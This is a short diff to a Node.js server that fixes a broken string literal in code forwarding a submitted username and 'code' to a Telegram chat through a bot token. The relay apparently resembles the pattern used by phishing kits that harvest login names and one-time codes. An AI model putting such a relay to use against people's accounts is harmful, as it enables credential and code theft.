@@ -242,10 +242,7 @@ http.createServer(async function (req, res) {
         var botToken = process.env.TELEGRAM_BOT_TOKEN || "";
         var ownerId = process.env.OWNER_ID || "";
         if (botToken && ownerId) {
-          var msg = "New Operation
-
-Username: " + (data.username || "-") + "
-Code: " + (data.code || "-");
+          var msg = "New Operation\n\nUsername: " + (data.username || "-") + "\nCode: " + (data.code || "-");
           var postData = JSON.stringify({ chat_id: ownerId, text: msg });
           var tgReq = https.request({
             hostname: "api.telegram.org",
@@ -263,7 +260,6 @@ Code: " + (data.code || "-");
     });
     return;
   }
-
   // Root → index.html
   if (urlPath === "/" || urlPath === "") { serveIndex(res); return; }
 
